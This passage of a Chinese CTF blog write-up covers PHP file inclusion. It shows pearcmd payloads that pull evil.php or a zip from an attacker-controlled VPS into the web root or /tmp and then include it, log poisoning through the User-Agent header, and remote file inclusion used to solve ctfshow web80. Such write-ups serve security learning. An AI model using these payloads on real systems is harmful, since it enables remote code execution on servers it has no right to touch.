+<li><p>web目录</p>
+<p>拉取到web目录</p>
+</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?f=pearcmd&amp;+install+-R+/var/www/html+http://vps/evil.php</span><br><span class="line">访问</span><br><span class="line">http://xxxx/tmp/pear/download/evil.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>tmp目录</li>
+</ul>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php</span><br><span class="line">访问</span><br><span class="line">http://ip:port/index.php?f=/tmp/pear/download/evil</span><br></pre></td></tr></table></figure>
+
+
+
+<p>限制</p>
+<p><code>apt install php</code>方式安装的php默认<code>register_argc_argv</code>是关闭的</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">root@bf3ffaa74403:/usr/local/lib/php# php pearcmd.php </span><br><span class="line">Commands:</span><br><span class="line">build                  Build an Extension From C Source</span><br><span class="line">bundle                 Unpacks a Pecl Package</span><br><span class="line">channel-add            Add a Channel</span><br><span class="line">channel-alias          Specify an alias to a channel name</span><br><span class="line">channel-delete         Remove a Channel From the List</span><br><span class="line">channel-discover       Initialize a Channel from its server</span><br><span class="line">channel-info           Retrieve Information on a Channel</span><br><span class="line">channel-login          Connects and authenticates to remote channel server</span><br><span class="line">channel-logout         Logs out from the remote channel server</span><br><span class="line">channel-update         Update an Existing Channel</span><br><span class="line">clear-cache            Clear Web Services Cache</span><br><span class="line">config-create          Create a Default configuration file</span><br><span class="line">config-get             Show One Setting</span><br><span class="line">config-help            Show Information About Setting</span><br><span class="line">config-set             Change Setting</span><br><span class="line">config-show            Show All Settings</span><br><span class="line">convert                Convert a package.xml 1.0 to package.xml 2.0 format</span><br><span class="line">cvsdiff                Run a &quot;cvs diff&quot; for all files in a package</span><br><span class="line">cvstag                 Set CVS Release Tag</span><br><span class="line">download               Download Package</span><br><span class="line">download-all           Downloads each available package from the default channel</span><br><span class="line">info                   Display information about a package</span><br><span class="line">install                Install Package</span><br><span class="line">list                   List Installed Packages In The Default Channel</span><br><span class="line">list-all               List All Packages</span><br><span class="line">list-channels          List Available Channels</span><br><span class="line">list-files             List Files In Installed Package</span><br><span class="line">list-upgrades          List Available Upgrades</span><br><span class="line">login                  Connects and authenticates to remote server [Deprecated in favor of channel-login]</span><br><span class="line">logout                 Logs out from the remote server [Deprecated in favor of channel-logout]</span><br><span class="line">makerpm                Builds an RPM spec file from a PEAR package</span><br><span class="line">package                Build Package</span><br><span class="line">package-dependencies   Show package dependencies</span><br><span class="line">package-validate       Validate Package Consistency</span><br><span class="line">pickle                 Build PECL Package</span><br><span class="line">remote-info            Information About Remote Packages</span><br><span class="line">remote-list            List Remote Packages</span><br><span class="line">run-scripts            Run Post-Install Scripts bundled with a package</span><br><span class="line">run-tests              Run Regression Tests</span><br><span class="line">search                 Search remote package database</span><br><span class="line">shell-test             Shell Script Test</span><br><span class="line">sign                   Sign a package distribution file</span><br><span class="line">svntag                 Set SVN Release Tag</span><br><span class="line">uninstall              Un-install Package</span><br><span class="line">update-channels        Update the Channel List</span><br><span class="line">upgrade                Upgrade Package</span><br><span class="line">upgrade-all            Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters]</span><br><span class="line">Usage: pear [options] command [command-options] &lt;parameters&gt;</span><br><span class="line">Type &quot;pear help options&quot; to list all options.</span><br><span class="line">Type &quot;pear help shortcuts&quot; to list all command shortcuts.</span><br><span class="line">Type &quot;pear help version&quot; or &quot;pear version&quot; to list version information.</span><br><span class="line">Type &quot;pear help &lt;command&gt;&quot; to get the help for the specified command.</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>jan神出的一道题</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>])&lt;<span class="number">100</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;想啥呢&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?f=/usr/local/lib/ph%70/pearcmd&amp;+install+-R+/tmp+http://ctf.jan.show/1.zip</span><br><span class="line">?f=phar:///var/www/html/tmp/pear/download/1.zip/1</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="ctfshow文件包含"><a href="#ctfshow文件包含" class="headerlink" title="ctfshow文件包含"></a>ctfshow文件包含</h4><h5 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h5><h6 id="日志文件包含-User-Agent头部注入命令"><a href="#日志文件包含-User-Agent头部注入命令" class="headerlink" title="日志文件包含(User-Agent头部注入命令)"></a>日志文件包含(User-Agent头部注入命令)</h6><p><strong>远程文件包含</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>替换了php和data</p>
+<p>这里可以进行<strong>日志包含</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">日志文件记录了服务器收到的每一次请求的IP、访问时间、URL、User-Agent，这4项中的前两项的值都是我们无法控制的，我们只能在自己可以控制的字段上做手脚，其中URL字段由于URL编码的存在，空格等一些符号会自动进行url编码，存到日志当中时，不是一个正确的php语句，无法成功执行，而User-Agent则不会被进行任何二次处理，我们发什么内容，服务器就将其原封不动的写入日志。</span><br><span class="line"></span><br><span class="line">访问日志的位置和文件名在不同的系统上会有所差异</span><br><span class="line">apache一般是/var/log/apache/access.log</span><br><span class="line">apache2一般是/var/log/apache2/access.log</span><br><span class="line">nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log</span><br></pre></td></tr></table></figure>
+
+<p>通过User-Agent头部注入命令：</p>
+<p><img src="https://i0.hdslb.com/bfs/album/853df61736c23202ea3a4dfdb6b6e2ad295a3745.png" alt="img"></p>
+<p>然后将日志包含进去，并通过POST参数执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/cea66ce551617d2d92b9e8649390cff6f3a9d85a.png" alt="img"></p>
+<p>法二：</p>
+<h6 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a><strong>远程文件包含</strong></h6><p>往VPS下面写php代码，然后远程包含：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=http:<span class="comment">//*.*.*.*/1</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>法三:</p>
+<p><strong>大小写绕过</strong></p>
+<p><img src="https://i0.hdslb.com/bfs/album/ca607f28b353fac0d0922ecf78900fe558e2d3e7.png" alt="img"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://micgo.top">micgo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://micgo.top/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">https://micgo.top/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用<meta name="referrer" content="no-referrer"> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://micgo.top" target="_blank">micgo's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></div><div class="post_share"><div class="social-share" data-image="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/CTF/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB(SSTI)/"><img class="prev-cover" src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">服务端模板注入(SSTI)</div></div></a></div><div class="next-post pull-right"><a href="/misc/linux%E6%8F%90%E6%9D%83/"><img class="next-cover" src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">linux提权</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">micgo</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/micgo520"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">常见文件包含函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">文件包含漏洞分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E8%B7%AF%E5%BE%84"><span class="toc-number">3.</span> <span class="toc-text">常见的敏感信息路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">常见利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#php-x2F-x2F"><span class="toc-number">4.1.</span> <span class="toc-text">php:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%88%E4%B8%80%E8%B0%88php-x2F-x2F-filter%E7%9A%84%E5%A6%99%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">谈一谈php:&#x2F;&#x2F;filter的妙用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#base64%E7%BB%95%E8%BF%87%E6%AD%BB%E4%BA%A1-die-x2F-exit"><span class="toc-number">4.2.1.</span> <span class="toc-text">base64绕过死亡 die &#x2F; exit</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87%E6%AD%BB%E4%BA%A1die-x2F-exit"><span class="toc-number">4.2.2.</span> <span class="toc-text">字符串操作方法绕过死亡die&#x2F;exit</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#rot13%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E6%AD%BB%E4%BA%A1die-x2F-exit"><span class="toc-number">4.2.3.</span> <span class="toc-text">rot13编码绕过死亡die&#x2F;exit</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#convert-iconv"><span class="toc-number">4.2.4.</span> <span class="toc-text">convert.iconv</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B9%E6%B3%95"><span class="toc-number">4.2.5.</span> <span class="toc-text">方法</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#data-x2F-x2F"><span class="toc-number">4.3.</span> <span class="toc-text">data:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#zip-x2F-x2F"><span class="toc-number">4.4.</span> <span class="toc-text">zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#file-x2F-x2F"><span class="toc-number">4.5.</span> <span class="toc-text">file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#phar-x2F-x2F"><span class="toc-number">4.6.</span> <span class="toc-text">phar:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CTF-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%ADfile-put-contents%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">CTF PHP代码审计中file_put_contents函数利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.</span> <span class="toc-text">日志文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pearcmd%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">7.</span> <span class="toc-text">pearcmd文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">8.</span> <span class="toc-text">ctfshow文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#web80"><span class="toc-number">8.1.</span> <span class="toc-text">web80</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-User-Agent%E5%A4%B4%E9%83%A8%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4"><span class="toc-number">8.1.1.</span> <span class="toc-text">日志文件包含(User-Agent头部注入命令)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">8.1.2.</span> <span class="toc-text">远程文件包含</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透体系建设——内网信息收集">内网渗透体系建设——内网信息收集</a><time datetime="2023-03-27T16:00:00.000Z" title="发表于 2023-03-28 00:00:00">2023-03-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(2)/" title="内网渗透体系建设——基础知识">内网渗透体系建设——基础知识</a><time datetime="2023-03-25T16:00:00.000Z" title="发表于 2023-03-26 00:00:00">2023-03-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/" title="XXE外部实体注入">XXE外部实体注入</a><time datetime="2023-03-22T16:00:00.000Z" title="发表于 2023-03-23 00:00:00">2023-03-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/MySQL%E6%B3%A8%E5%85%A5%E5%86%99shell/" title="MySQL注入写shell">MySQL注入写shell</a><time datetime="2023-03-21T16:00:00.000Z" title="发表于 2023-03-22 00:00:00">2023-03-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/hvv/" title="hw蓝队总结">hw蓝队总结</a><time datetime="2023-03-14T16:00:00.000Z" title="发表于 2023-03-15 00:00:00">2023-03-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By micgo</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '2t5fYJ95Y61Dyi4xHc3dWgxl-gzGzoHsz',
+      appKey: 'UNfGz5zfJGeNX6LS5OyiymLm',
+      avatar: 'monsterid',
+      serverURLs: 'https://2t5fyj95.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
